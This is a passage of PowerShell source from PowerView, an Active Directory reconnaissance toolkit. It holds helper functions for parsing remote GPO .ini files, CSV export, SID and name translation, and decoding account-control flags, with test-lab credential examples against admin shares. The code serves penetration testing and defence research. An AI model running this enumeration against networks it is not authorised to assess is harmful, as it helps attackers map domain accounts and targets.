'^(Mandatory|Position|ParameterSetName|DontShow|HelpMessage|ValueFromPipeline|ValueFromPipelineByPropertyName|ValueFromRemainingArguments)$'","            $ValidationRegex = '^(AllowNull|AllowEmptyString|AllowEmptyCollection|ValidateCount|ValidateLength|ValidatePattern|ValidateRange|ValidateScript|ValidateSet|ValidateNotNull|ValidateNotNullOrEmpty)$'","            $AliasRegex = '^Alias$'","            $ParameterAttribute = New-Object -TypeName System.Management.Automation.ParameterAttribute","","            switch -regex ($PSBoundParameters.Keys) {","                $AttributeRegex {","                    Try {","                        $ParameterAttribute.$_ = . $GetVar","                    }","                    Catch {","                        $_","                    }","                    continue","                }","            }","","            if($DPDictionary.Keys -contains $Name) {","                $DPDictionary.$Name.Attributes.Add($ParameterAttribute)","            }","            else {","                $AttributeCollection = New-Object -TypeName Collections.ObjectModel.Collection[System.Attribute]","                switch -regex ($PSBoundParameters.Keys) {","                    $ValidationRegex {","                        Try {","                            $ParameterOptions = New-Object -TypeName \"System.Management.Automation.${_}Attribute\" -ArgumentList (. $GetVar) -ErrorAction Stop","                            $AttributeCollection.Add($ParameterOptions)","                        }","                        Catch { $_ }","                        continue","                    }","                    $AliasRegex {","                        Try {","                            $ParameterAlias = New-Object -TypeName System.Management.Automation.AliasAttribute -ArgumentList (. $GetVar) -ErrorAction Stop","                            $AttributeCollection.Add($ParameterAlias)","                            continue","                        }","                        Catch { $_ }","                    }","                }","                $AttributeCollection.Add($ParameterAttribute)","                $Parameter = New-Object -TypeName System.Management.Automation.RuntimeDefinedParameter -ArgumentList @($Name, $Type, $AttributeCollection)","                $DPDictionary.Add($Name, $Parameter)","            }","        }","    }","","    End {","        if(!$CreateVariables -and !$Dictionary) {","            $DPDictionary","        }","    }","}","","","function Get-IniContent {","\u003c#",".SYNOPSIS","","This helper parses an .ini file into a hashtable.","","Author: 'The Scripting Guys'","Modifications: @harmj0y (-Credential support)","License: BSD 3-Clause","Required Dependencies: Add-RemoteConnection, Remove-RemoteConnection","",".DESCRIPTION","","Parses an .ini file into a hashtable. If -Credential is supplied,","then Add-RemoteConnection is used to map \\\\COMPUTERNAME\\IPC$, the file","is parsed, and then the connection is destroyed with Remove-RemoteConnection.","",".PARAMETER Path","","Specifies the path to the .ini file to parse.","",".PARAMETER OutputObject","","Switch. Output a custom PSObject instead of a hashtable.","",".PARAMETER Credential","","A [Management.Automation.PSCredential] object of alternate credentials","for connection to the remote system.","",".EXAMPLE","","Get-IniContent C:\\Windows\\example.ini","",".EXAMPLE","","\"C:\\Windows\\example.ini\" | Get-IniContent -OutputObject","","Outputs the .ini details as a proper nested PSObject.","",".EXAMPLE","","\"C:\\Windows\\example.ini\" | Get-IniContent","",".EXAMPLE","","$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force","$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)","Get-IniContent -Path \\\\PRIMARY.testlab.local\\C$\\Temp\\GptTmpl.inf -Credential $Cred","",".INPUTS","","String","","Accepts one or more .ini paths on the pipeline.","",".OUTPUTS","","Hashtable","","Ouputs a hashtable representing the parsed .ini file.","",".LINK","","https://blogs.technet.microsoft.com/heyscriptingguy/2011/08/20/use-powershell-to-work-with-any-ini-file/","#\u003e","","    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]","    [OutputType([Hashtable])]","    [CmdletBinding()]","    Param(","        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]","        [Alias('FullName', 'Name')]","        [ValidateNotNullOrEmpty()]","        [String[]]","        $Path,","","        [Management.Automation.PSCredential]","        [Management.Automation.CredentialAttribute()]","        $Credential = [Management.Automation.PSCredential]::Empty,","","        [Switch]","        $OutputObject","    )","","    BEGIN {","        $MappedComputers = @{}","    }","","    PROCESS {","        ForEach ($TargetPath in $Path) {","            if (($TargetPath -Match '\\\\\\\\.*\\\\.*') -and ($PSBoundParameters['Credential'])) {","                $HostComputer = (New-Object System.Uri($TargetPath)).Host","                if (-not $MappedComputers[$HostComputer]) {","                    # map IPC$ to this computer if it's not already","                    Add-RemoteConnection -ComputerName $HostComputer -Credential $Credential","                    $MappedComputers[$HostComputer] = $True","                }","            }","","            if (Test-Path -Path $TargetPath) {","                if ($PSBoundParameters['OutputObject']) {","                    $IniObject = New-Object PSObject","                }","                else {","                    $IniObject = @{}","                }","                Switch -Regex -File $TargetPath {","                    \"^\\[(.+)\\]\" # Section","                    {","                        $Section = $matches[1].Trim()","                        if ($PSBoundParameters['OutputObject']) {","                            $Section = $Section.Replace(' ', '')","                            $SectionObject = New-Object PSObject","                            $IniObject | Add-Member Noteproperty $Section $SectionObject","                        }","                        else {","                            $IniObject[$Section] = @{}","                        }","                        $CommentCount = 0","                    }","                    \"^(;.*)$\" # Comment","                    {","                        $Value = $matches[1].Trim()","                        $CommentCount = $CommentCount + 1","                        $Name = 'Comment' + $CommentCount","                        if ($PSBoundParameters['OutputObject']) {","                            $Name = $Name.Replace(' ', '')","                            $IniObject.$Section | Add-Member Noteproperty $Name $Value","                        }","                        else {","                            $IniObject[$Section][$Name] = $Value","                        }","                    }","                    \"(.+?)\\s*=(.*)\" # Key","                    {","                        $Name, $Value = $matches[1..2]","                        $Name = $Name.Trim()","                        $Values = $Value.split(',') | ForEach-Object { $_.Trim() }","","                        # if ($Values -isnot [System.Array]) { $Values = @($Values) }","","                        if ($PSBoundParameters['OutputObject']) {","                            $Name = $Name.Replace(' ', '')","                            $IniObject.$Section | Add-Member Noteproperty $Name $Values","                        }","                        else {","                            $IniObject[$Section][$Name] = $Values","                        }","                    }","                }","                $IniObject","            }","        }","    }","","    END {","        # remove the IPC$ mappings","        $MappedComputers.Keys | Remove-RemoteConnection","    }","}","","","function Export-PowerViewCSV {","\u003c#",".SYNOPSIS","","Converts objects into a series of comma-separated (CSV) strings and saves the","strings in a CSV file in a thread-safe manner.","","Author: Will Schroeder (@harmj0y)  ","License: BSD 3-Clause  ","Required Dependencies: None  ","",".DESCRIPTION","","This helper exports an -InputObject to a .csv in a thread-safe manner","using a mutex. This is so the various multi-threaded functions in","PowerView has a thread-safe way to export output to the same file.","Uses .NET IO.FileStream/IO.StreamWriter objects for speed.","","Originally based on Dmitry Sotnikov's Export-CSV code: http://poshcode.org/1590","",".PARAMETER InputObject","","Specifies the objects to export as CSV strings.","",".PARAMETER Path","","Specifies the path to the CSV output file.","",".PARAMETER Delimiter","","Specifies a delimiter to separate the property values. The default is a comma (,)","",".PARAMETER Append","","Indicates that this cmdlet adds the CSV output to the end of the specified file.","Without this parameter, Export-PowerViewCSV replaces the file contents without warning.","",".EXAMPLE","","Get-DomainUser | Export-PowerViewCSV -Path \"users.csv\"","",".EXAMPLE","","Get-DomainUser | Export-PowerViewCSV -Path \"users.csv\" -Append -Delimiter '|'","",".INPUTS","","PSObject","","Accepts one or more PSObjects on the pipeline.","",".LINK","","http://poshcode.org/1590","http://dmitrysotnikov.wordpress.com/2010/01/19/Export-Csv-append/","#\u003e","","    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]","    [CmdletBinding()]","    Param(","        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]","        [System.Management.Automation.PSObject[]]","        $InputObject,","","        [Parameter(Mandatory = $True, Position = 1)]","        [ValidateNotNullOrEmpty()]","        [String]","        $Path,","","        [Parameter(Position = 2)]","        [ValidateNotNullOrEmpty()]","        [Char]","        $Delimiter = ',',","","        [Switch]","        $Append","    )","","    BEGIN {","        $OutputPath = [IO.Path]::GetFullPath($PSBoundParameters['Path'])","        $Exists = [System.IO.File]::Exists($OutputPath)","","        # mutex so threaded code doesn't stomp on the output file","        $Mutex = New-Object System.Threading.Mutex $False,'CSVMutex'","        $Null = $Mutex.WaitOne()","","        if ($PSBoundParameters['Append']) {","            $FileMode = [System.IO.FileMode]::Append","        }","        else {","            $FileMode = [System.IO.FileMode]::Create","            $Exists = $False","        }","","        $CSVStream = New-Object IO.FileStream($OutputPath, $FileMode, [System.IO.FileAccess]::Write, [IO.FileShare]::Read)","        $CSVWriter = New-Object System.IO.StreamWriter($CSVStream)","        $CSVWriter.AutoFlush = $True","    }","","    PROCESS {","        ForEach ($Entry in $InputObject) {","            $ObjectCSV = ConvertTo-Csv -InputObject $Entry -Delimiter $Delimiter -NoTypeInformation","","            if (-not $Exists) {","                # output the object field names as well","                $ObjectCSV | ForEach-Object { $CSVWriter.WriteLine($_) }","                $Exists = $True","            }","            else {","                # only output object field data","                $ObjectCSV[1..($ObjectCSV.Length-1)] | ForEach-Object { $CSVWriter.WriteLine($_) }","            }","        }","    }","","    END {","        $Mutex.ReleaseMutex()","        $CSVWriter.Dispose()","        $CSVStream.Dispose()","    }","}","","","function Resolve-IPAddress {","\u003c#",".SYNOPSIS","","Resolves a given hostename to its associated IPv4 address.","","Author: Will Schroeder (@harmj0y)  ","License: BSD 3-Clause  ","Required Dependencies: None  ","",".DESCRIPTION","","Resolves a given hostename to its associated IPv4 address using","[Net.Dns]::GetHostEntry(). If no hostname is provided, the default","is the IP address of the localhost.","",".EXAMPLE","","Resolve-IPAddress -ComputerName SERVER","",".EXAMPLE","","@(\"SERVER1\", \"SERVER2\") | Resolve-IPAddress","",".INPUTS","","String","","Accepts one or more IP address strings on the pipeline.","",".OUTPUTS","","System.Management.Automation.PSCustomObject","","A custom PSObject with the ComputerName and IPAddress.","#\u003e","","    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]","    [OutputType('System.Management.Automation.PSCustomObject')]","    [CmdletBinding()]","    Param(","        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]","        [Alias('HostName', 'dnshostname', 'name')]","        [ValidateNotNullOrEmpty()]","        [String[]]","        $ComputerName = $Env:COMPUTERNAME","    )","","    PROCESS {","        ForEach ($Computer in $ComputerName) {","            try {","                @(([Net.Dns]::GetHostEntry($Computer)).AddressList) | ForEach-Object {","                    if ($_.AddressFamily -eq 'InterNetwork') {","                        $Out = New-Object PSObject","                        $Out | Add-Member Noteproperty 'ComputerName' $Computer","                        $Out | Add-Member Noteproperty 'IPAddress' $_.IPAddressToString","                        $Out","                    }","                }","            }","            catch {","                Write-Verbose \"[Resolve-IPAddress] Could not resolve $Computer to an IP Address.\"","            }","        }","    }","}","","","function ConvertTo-SID {","\u003c#",".SYNOPSIS","","Converts a given user/group name to a security identifier (SID).","","Author: Will Schroeder (@harmj0y)  ","License: BSD 3-Clause  ","Required Dependencies: Convert-ADName, Get-DomainObject, Get-Domain  ","",".DESCRIPTION","","Converts a \"DOMAIN\\username\" syntax to a security identifier (SID)","using System.Security.Principal.NTAccount's translate function. If alternate","credentials are supplied, then Get-ADObject is used to try to map the name","to a security identifier.","",".PARAMETER ObjectName","","The user/group name to convert, can be 'user' or 'DOMAIN\\user' format.","",".PARAMETER Domain","","Specifies the domain to use for the translation, defaults to the current domain.","",".PARAMETER Server","","Specifies an Active Directory server (domain controller) to bind to for the translation.","",".PARAMETER Credential","","Specifies an alternate credential to use for the translation.","",".EXAMPLE","","ConvertTo-SID 'DEV\\dfm'","",".EXAMPLE","","'DEV\\dfm','DEV\\krbtgt' | ConvertTo-SID","",".EXAMPLE","","$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force","$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)","'TESTLAB\\dfm' | ConvertTo-SID -Credential $Cred","",".INPUTS","","String","","Accepts one or more username specification strings on the pipeline.","",".OUTPUTS","","String","","A string representing the SID of the translated name.","#\u003e","","    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]","    [OutputType([String])]","    [CmdletBinding()]","    Param(","        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]","        [Alias('Name', 'Identity')]","        [String[]]","        $ObjectName,","","        [ValidateNotNullOrEmpty()]","        [String]","        $Domain,","","        [ValidateNotNullOrEmpty()]","        [Alias('DomainController')]","        [String]","        $Server,","","        [Management.Automation.PSCredential]","        [Management.Automation.CredentialAttribute()]","        $Credential = [Management.Automation.PSCredential]::Empty","    )","","    BEGIN {","        $DomainSearcherArguments = @{}","        if ($PSBoundParameters['Domain']) { $DomainSearcherArguments['Domain'] = $Domain }","        if ($PSBoundParameters['Server']) { $DomainSearcherArguments['Server'] = $Server }","        if ($PSBoundParameters['Credential']) { $DomainSearcherArguments['Credential'] = $Credential }","    }","","    PROCESS {","        ForEach ($Object in $ObjectName) {","            $Object = $Object -Replace '/','\\'","","            if ($PSBoundParameters['Credential']) {","                $DN = Convert-ADName -Identity $Object -OutputType 'DN' @DomainSearcherArguments","                if ($DN) {","                    $UserDomain = $DN.SubString($DN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'","                    $UserName = $DN.Split(',')[0].split('=')[1]","","                    $DomainSearcherArguments['Identity'] = $UserName","                    $DomainSearcherArguments['Domain'] = $UserDomain","                    $DomainSearcherArguments['Properties'] = 'objectsid'","                    Get-DomainObject @DomainSearcherArguments | Select-Object -Expand objectsid","                }","            }","            else {","                try {","                    if ($Object.Contains('\\')) {","                        $Domain = $Object.Split('\\')[0]","                        $Object = $Object.Split('\\')[1]","                    }","                    elseif (-not $PSBoundParameters['Domain']) {","                        $DomainSearcherArguments = @{}","                        $Domain = (Get-Domain @DomainSearcherArguments).Name","                    }","","                    $Obj = (New-Object System.Security.Principal.NTAccount($Domain, $Object))","                    $Obj.Translate([System.Security.Principal.SecurityIdentifier]).Value","                }","                catch {","                    Write-Verbose \"[ConvertTo-SID] Error converting $Domain\\$Object : $_\"","                }","            }","        }","    }","}","","","function ConvertFrom-SID {","\u003c#",".SYNOPSIS","","Converts a security identifier (SID) to a group/user name.","","Author: Will Schroeder (@harmj0y)  ","License: BSD 3-Clause  ","Required Dependencies: Convert-ADName  ","",".DESCRIPTION","","Converts a security identifier string (SID) to a group/user name","using Convert-ADName.","",".PARAMETER ObjectSid","","Specifies one or more SIDs to convert.","",".PARAMETER Domain","","Specifies the domain to use for the translation, defaults to the current domain.","",".PARAMETER Server","","Specifies an Active Directory server (domain controller) to bind to for the translation.","",".PARAMETER Credential","","Specifies an alternate credential to use for the translation.","",".EXAMPLE","","ConvertFrom-SID S-1-5-21-890171859-3433809279-3366196753-1108","","TESTLAB\\harmj0y","",".EXAMPLE","","\"S-1-5-21-890171859-3433809279-3366196753-1107\", \"S-1-5-21-890171859-3433809279-3366196753-1108\", \"S-1-5-32-562\" | ConvertFrom-SID","","TESTLAB\\WINDOWS2$","TESTLAB\\harmj0y","BUILTIN\\Distributed COM Users","",".EXAMPLE","","$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force","$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm', $SecPassword)","ConvertFrom-SID S-1-5-21-890171859-3433809279-3366196753-1108 -Credential $Cred","","TESTLAB\\harmj0y","",".INPUTS","","String","","Accepts one or more SID strings on the pipeline.","",".OUTPUTS","","String","","The converted DOMAIN\\username.","#\u003e","","    [OutputType([String])]","    [CmdletBinding()]","    Param(","        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]","        [Alias('SID')]","        [ValidatePattern('^S-1-.*')]","        [String[]]","        $ObjectSid,","","        [ValidateNotNullOrEmpty()]","        [String]","        $Domain,","","        [ValidateNotNullOrEmpty()]","        [Alias('DomainController')]","        [String]","        $Server,","","        [Management.Automation.PSCredential]","        [Management.Automation.CredentialAttribute()]","        $Credential = [Management.Automation.PSCredential]::Empty","    )","","    BEGIN {","        $ADNameArguments = @{}","        if ($PSBoundParameters['Domain']) { $ADNameArguments['Domain'] = $Domain }","        if ($PSBoundParameters['Server']) { $ADNameArguments['Server'] = $Server }","        if ($PSBoundParameters['Credential']) { $ADNameArguments['Credential'] = $Credential }","    }","","    PROCESS {","        ForEach ($TargetSid in $ObjectSid) {","            $TargetSid = $TargetSid.trim('*')","            try {","                # try to resolve any built-in SIDs first - https://support.microsoft.com/en-us/kb/243330","                Switch ($TargetSid) {","                    'S-1-0'         { 'Null Authority' }","                    'S-1-0-0'       { 'Nobody' }","                    'S-1-1'         { 'World Authority' }","                    'S-1-1-0'       { 'Everyone' }","                    'S-1-2'         { 'Local Authority' }","                    'S-1-2-0'       { 'Local' }","                    'S-1-2-1'       { 'Console Logon ' }","                    'S-1-3'         { 'Creator Authority' }","                    'S-1-3-0'       { 'Creator Owner' }","                    'S-1-3-1'       { 'Creator Group' }","                    'S-1-3-2'       { 'Creator Owner Server' }","                    'S-1-3-3'       { 'Creator Group Server' }","                    'S-1-3-4'       { 'Owner Rights' }","                    'S-1-4'         { 'Non-unique Authority' }","                    'S-1-5'         { 'NT Authority' }","                    'S-1-5-1'       { 'Dialup' }","                    'S-1-5-2'       { 'Network' }","                    'S-1-5-3'       { 'Batch' }","                    'S-1-5-4'       { 'Interactive' }","                    'S-1-5-6'       { 'Service' }","                    'S-1-5-7'       { 'Anonymous' }","                    'S-1-5-8'       { 'Proxy' }","                    'S-1-5-9'       { 'Enterprise Domain Controllers' }","                    'S-1-5-10'      { 'Principal Self' }","                    'S-1-5-11'      { 'Authenticated Users' }","                    'S-1-5-12'      { 'Restricted Code' }","                    'S-1-5-13'      { 'Terminal Server Users' }","                    'S-1-5-14'      { 'Remote Interactive Logon' }","                    'S-1-5-15'      { 'This Organization ' }","                    'S-1-5-17'      { 'This Organization ' }","                    'S-1-5-18'      { 'Local System' }","                    'S-1-5-19'      { 'NT Authority' }","                    'S-1-5-20'      { 'NT Authority' }","                    'S-1-5-80-0'    { 'All Services ' }","                    'S-1-5-32-544'  { 'BUILTIN\\Administrators' }","                    'S-1-5-32-545'  { 'BUILTIN\\Users' }","                    'S-1-5-32-546'  { 'BUILTIN\\Guests' }","                    'S-1-5-32-547'  { 'BUILTIN\\Power Users' }","                    'S-1-5-32-548'  { 'BUILTIN\\Account Operators' }","                    'S-1-5-32-549'  { 'BUILTIN\\Server Operators' }","                    'S-1-5-32-550'  { 'BUILTIN\\Print Operators' }","                    'S-1-5-32-551'  { 'BUILTIN\\Backup Operators' }","                    'S-1-5-32-552'  { 'BUILTIN\\Replicators' }","                    'S-1-5-32-554'  { 'BUILTIN\\Pre-Windows 2000 Compatible Access' }","                    'S-1-5-32-555'  { 'BUILTIN\\Remote Desktop Users' }","                    'S-1-5-32-556'  { 'BUILTIN\\Network Configuration Operators' }","                    'S-1-5-32-557'  { 'BUILTIN\\Incoming Forest Trust Builders' }","                    'S-1-5-32-558'  { 'BUILTIN\\Performance Monitor Users' }","                    'S-1-5-32-559'  { 'BUILTIN\\Performance Log Users' }","                    'S-1-5-32-560'  { 'BUILTIN\\Windows Authorization Access Group' }","                    'S-1-5-32-561'  { 'BUILTIN\\Terminal Server License Servers' }","                    'S-1-5-32-562'  { 'BUILTIN\\Distributed COM Users' }","                    'S-1-5-32-569'  { 'BUILTIN\\Cryptographic Operators' }","                    'S-1-5-32-573'  { 'BUILTIN\\Event Log Readers' }","                    'S-1-5-32-574'  { 'BUILTIN\\Certificate Service DCOM Access' }","                    'S-1-5-32-575'  { 'BUILTIN\\RDS Remote Access Servers' }","                    'S-1-5-32-576'  { 'BUILTIN\\RDS Endpoint Servers' }","                    'S-1-5-32-577'  { 'BUILTIN\\RDS Management Servers' }","                    'S-1-5-32-578'  { 'BUILTIN\\Hyper-V Administrators' }","                    'S-1-5-32-579'  { 'BUILTIN\\Access Control Assistance Operators' }","                    'S-1-5-32-580'  { 'BUILTIN\\Access Control Assistance Operators' }","                    Default {","                        Convert-ADName -Identity $TargetSid @ADNameArguments","                    }","                }","            }","            catch {","                Write-Verbose \"[ConvertFrom-SID] Error converting SID '$TargetSid' : $_\"","            }","        }","    }","}","","","function Convert-ADName {","\u003c#",".SYNOPSIS","","Converts Active Directory object names between a variety of formats.","","Author: Bill Stewart, Pasquale Lantella  ","Modifications: Will Schroeder (@harmj0y)  ","License: BSD 3-Clause  ","Required Dependencies: None  ","",".DESCRIPTION","","This function is heavily based on Bill Stewart's code and Pasquale Lantella's code (in LINK)","and translates Active Directory names between various formats using the NameTranslate COM object.","",".PARAMETER Identity","","Specifies the Active Directory object name to translate, of the following form:","","    DN                short for 'distinguished name'; e.g., 'CN=Phineas Flynn,OU=Engineers,DC=fabrikam,DC=com'","    Canonical         canonical name; e.g., 'fabrikam.com/Engineers/Phineas Flynn'","    NT4               domain\\username; e.g., 'fabrikam\\pflynn'","    Display           display name, e.g. 'pflynn'","    DomainSimple      simple domain name format, e.g. 'pflynn@fabrikam.com'","    EnterpriseSimple  simple enterprise name format, e.g. 'pflynn@fabrikam.com'","    GUID              GUID; e.g., '{95ee9fff-3436-11d1-b2b0-d15ae3ac8436}'","    UPN               user principal name; e.g., 'pflynn@fabrikam.com'","    CanonicalEx       extended canonical name format","    SPN               service principal name format; e.g. 'HTTP/kairomac.contoso.com'","    SID               Security Identifier; e.g., 'S-1-5-21-12986231-600641547-709122288-57999'","",".PARAMETER OutputType","","Specifies the output name type you want to convert to, which must be one of the following:","","    DN                short for 'distinguished name'; e.g., 'CN=Phineas Flynn,OU=Engineers,DC=fabrikam,DC=com'","    Canonical         canonical name; e.g., 'fabrikam.com/Engineers/Phineas Flynn'","    NT4               domain\\username; e.g., 'fabrikam\\pflynn'","    Display           display name, e.g. 'pflynn'","    DomainSimple      simple domain name format, e.g. 'pflynn@fabrikam.com'","    EnterpriseSimple  simple enterprise name format, e.g. 'pflynn@fabrikam.com'","    GUID              GUID; e.g., '{95ee9fff-3436-11d1-b2b0-d15ae3ac8436}'","    UPN               user principal name; e.g., 'pflynn@fabrikam.com'","    CanonicalEx       extended canonical name format, e.g. 'fabrikam.com/Users/Phineas Flynn'","    SPN               service principal name format; e.g. 'HTTP/kairomac.contoso.com'","",".PARAMETER Domain","","Specifies the domain to use for the translation, defaults to the current domain.","",".PARAMETER Server","","Specifies an Active Directory server (domain controller) to bind to for the translation.","",".PARAMETER Credential","","Specifies an alternate credential to use for the translation.","",".EXAMPLE","","Convert-ADName -Identity \"TESTLAB\\harmj0y\"","","harmj0y@testlab.local","",".EXAMPLE","","\"TESTLAB\\krbtgt\", \"CN=Administrator,CN=Users,DC=testlab,DC=local\" | Convert-ADName -OutputType Canonical","","testlab.local/Users/krbtgt","testlab.local/Users/Administrator","",".EXAMPLE","","Convert-ADName -OutputType dn -Identity 'TESTLAB\\harmj0y' -Server PRIMARY.testlab.local","","CN=harmj0y,CN=Users,DC=testlab,DC=local","",".EXAMPLE","","$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force","$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm', $SecPassword)","'S-1-5-21-890171859-3433809279-3366196753-1108' | Convert-ADNAme -Credential $Cred","","TESTLAB\\harmj0y","",".INPUTS","","String","","Accepts one or more objects name strings on the pipeline.","",".OUTPUTS","","String","","Outputs a string representing the converted name.","",".LINK","","http://windowsitpro.com/active-directory/translating-active-directory-object-names-between-formats","https://gallery.technet.microsoft.com/scriptcenter/Translating-Active-5c80dd67","#\u003e","","    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]","    [OutputType([String])]","    [CmdletBinding()]","    Param(","        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]","        [Alias('Name', 'ObjectName')]","        [String[]]","        $Identity,","","        [String]","        [ValidateSet('DN', 'Canonical', 'NT4', 'Display', 'DomainSimple', 'EnterpriseSimple', 'GUID', 'Unknown', 'UPN', 'CanonicalEx', 'SPN')]","        $OutputType,","","        [ValidateNotNullOrEmpty()]","        [String]","        $Domain,","","        [ValidateNotNullOrEmpty()]","        [Alias('DomainController')]","        [String]","        $Server,","","        [Management.Automation.PSCredential]","        [Management.Automation.CredentialAttribute()]","        $Credential = [Management.Automation.PSCredential]::Empty","    )","","    BEGIN {","        $NameTypes = @{","            'DN'                =   1  # CN=Phineas Flynn,OU=Engineers,DC=fabrikam,DC=com","            'Canonical'         =   2  # fabrikam.com/Engineers/Phineas Flynn","            'NT4'               =   3  # fabrikam\\pflynn","            'Display'           =   4  # pflynn","            'DomainSimple'      =   5  # pflynn@fabrikam.com","            'EnterpriseSimple'  =   6  # pflynn@fabrikam.com","            'GUID'              =   7  # {95ee9fff-3436-11d1-b2b0-d15ae3ac8436}","            'Unknown'           =   8  # unknown type - let the server do translation","            'UPN'               =   9  # pflynn@fabrikam.com","            'CanonicalEx'       =   10 # fabrikam.com/Users/Phineas Flynn","            'SPN'               =   11 # HTTP/kairomac.contoso.com","            'SID'               =   12 # S-1-5-21-12986231-600641547-709122288-57999","        }","","        # accessor functions from Bill Stewart to simplify calls to NameTranslate","        function Invoke-Method([__ComObject] $Object, [String] $Method, $Parameters) {","            $Output = $Null","            $Output = $Object.GetType().InvokeMember($Method, 'InvokeMethod', $NULL, $Object, $Parameters)","            Write-Output $Output","        }","","        function Get-Property([__ComObject] $Object, [String] $Property) {","            $Object.GetType().InvokeMember($Property, 'GetProperty', $NULL, $Object, $NULL)","        }","","        function Set-Property([__ComObject] $Object, [String] $Property, $Parameters) {","            [Void] $Object.GetType().InvokeMember($Property, 'SetProperty', $NULL, $Object, $Parameters)","        }","","        # https://msdn.microsoft.com/en-us/library/aa772266%28v=vs.85%29.aspx","        if ($PSBoundParameters['Server']) {","            $ADSInitType = 2","            $InitName = $Server","        }","        elseif ($PSBoundParameters['Domain']) {","            $ADSInitType = 1","            $InitName = $Domain","        }","        elseif ($PSBoundParameters['Credential']) {","            $Cred = $Credential.GetNetworkCredential()","            $ADSInitType = 1","            $InitName = $Cred.Domain","        }","        else {","            # if no domain or server is specified, default to GC initialization","            $ADSInitType = 3","            $InitName = $Null","        }","    }","","    PROCESS {","        ForEach ($TargetIdentity in $Identity) {","            if (-not $PSBoundParameters['OutputType']) {","                if ($TargetIdentity -match \"^[A-Za-z]+\\\\[A-Za-z ]+\") {","                    $ADSOutputType = $NameTypes['DomainSimple']","                }","                else {","                    $ADSOutputType = $NameTypes['NT4']","                }","            }","            else {","                $ADSOutputType = $NameTypes[$OutputType]","            }","","            $Translate = New-Object -ComObject NameTranslate","","            if ($PSBoundParameters['Credential']) {","                try {","                    $Cred = $Credential.GetNetworkCredential()","","                    Invoke-Method $Translate 'InitEx' (","                        $ADSInitType,","                        $InitName,","                        $Cred.UserName,","                        $Cred.Domain,","                        $Cred.Password","                    )","                }","                catch {","                    Write-Verbose \"[Convert-ADName] Error initializing translation for '$Identity' using alternate credentials : $_\"","                }","            }","            else {","                try {","                    $Null = Invoke-Method $Translate 'Init' (","                        $ADSInitType,","                        $InitName","                    )","                }","                catch {","                    Write-Verbose \"[Convert-ADName] Error initializing translation for '$Identity' : $_\"","                }","            }","","            # always chase all referrals","            Set-Property $Translate 'ChaseReferral' (0x60)","","            try {","                # 8 = Unknown name type -\u003e let the server do the work for us","                $Null = Invoke-Method $Translate 'Set' (8, $TargetIdentity)","                Invoke-Method $Translate 'Get' ($ADSOutputType)","            }","            catch [System.Management.Automation.MethodInvocationException] {","                Write-Verbose \"[Convert-ADName] Error translating '$TargetIdentity' : $($_.Exception.InnerException.Message)\"","            }","        }","    }","}","","","function ConvertFrom-UACValue {","\u003c#",".SYNOPSIS","","Converts a UAC int value to human readable form.","","Author: Will Schroeder (@harmj0y)  ","License: BSD 3-Clause  ","Required Dependencies: None  ","",".DESCRIPTION","","This function will take an integer that represents a User Account","Control (UAC) binary blob and will covert it to an ordered","dictionary with each bitwise value broken out. By default only values","set are displayed- the -ShowAll switch will display all values with","a + next to the ones set.","",".PARAMETER Value","","Specifies the integer UAC value to convert.","",".PARAMETER ShowAll","","Switch. Signals ConvertFrom-UACValue to display all UAC values, with a + indicating the value is currently set.","",".EXAMPLE","","ConvertFrom-UACValue -Value 66176","","Name                           Value","----                           -----","ENCRYPTED_TEXT_PWD_ALLOWED     128","NORMAL_ACCOUNT                 512","DONT_EXPIRE_PASSWORD           65536","",".EXAMPLE","","Get-DomainUser harmj0y | ConvertFrom-UACValue","","Name                           Value","----                           -----","NORMAL_ACCOUNT                 512","DONT_EXPIRE_PASSWORD           65536","",".EXAMPLE","","Get-DomainUser harmj0y | ConvertFrom-UACValue -ShowAll","","Name                           Value","----                           -----","SCRIPT                         1","ACCOUNTDISABLE                 2","HOMEDIR_REQUIRED               8","LOCKOUT                        16","PASSWD_NOTREQD                 32","PASSWD_CANT_CHANGE             64","ENCRYPTED_TEXT_PWD_ALLOWED     128","TEMP_DUPLICATE_ACCOUNT         256","NORMAL_ACCOUNT                 512+","INTERDOMAIN_TRUST_ACCOUNT      2048","WORKSTATION_TRUST_ACCOUNT      4096","SERVER_TRUST_ACCOUNT           8192","DONT_EXPIRE_PASSWORD           65536+","MNS_LOGON_ACCOUNT              131072","SMARTCARD_REQUIRED             262144","TRUSTED_FOR_DELEGATION         524288","NOT_DELEGATED                  1048576","USE_DES_KEY_ONLY               2097152","DONT_REQ_PREAUTH               4194304","PASSWORD_EXPIRED               8388608","TRUSTED_TO_AUTH_FOR_DELEGATION 16777216","PARTIAL_SECRETS_ACCOUNT        67108864","",".INPUTS","","Int","","Accepts an integer representing a UAC binary blob.","",".OUTPUTS","","System.Collections.Specialized.OrderedDictionary","","An ordered dictionary with the converted UAC fields.","",".LINK","","https://support.microsoft.com/en-us/kb/305144","#\u003e","","    [OutputType('System.Collections.Specialized.OrderedDictionary')]","    [CmdletBinding()]","    Param(","        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]","        [Alias('UAC', 'useraccountcontrol')]","        